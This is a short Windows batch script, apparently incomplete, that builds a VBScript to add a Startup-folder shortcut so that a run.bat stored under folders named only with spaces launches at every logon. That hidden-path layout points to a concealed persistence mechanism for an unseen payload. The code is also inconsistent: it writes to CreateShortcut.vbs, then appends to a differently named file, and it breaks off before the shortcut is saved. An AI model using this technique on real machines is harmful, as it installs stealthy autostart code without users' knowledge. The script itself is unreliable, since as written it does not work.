@echo off
setlocal

REM Define the path to the file you want to add to startup
set "fileToAdd=C:\Users\Public\ \ \pyC\run.bat"

REM Define the destination folder for the startup shortcut
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Create a shortcut to the file in the startup folder
echo Creating shortcut...
echo Set objShell = CreateObject("WScript.Shell") > %TEMP%\CreateShortcut.vbs
echo Set objLink = objShell.CreateShortcut("%startupFolder%\YourShortcut.lnk") >> %TEMP%\CreateShortcut
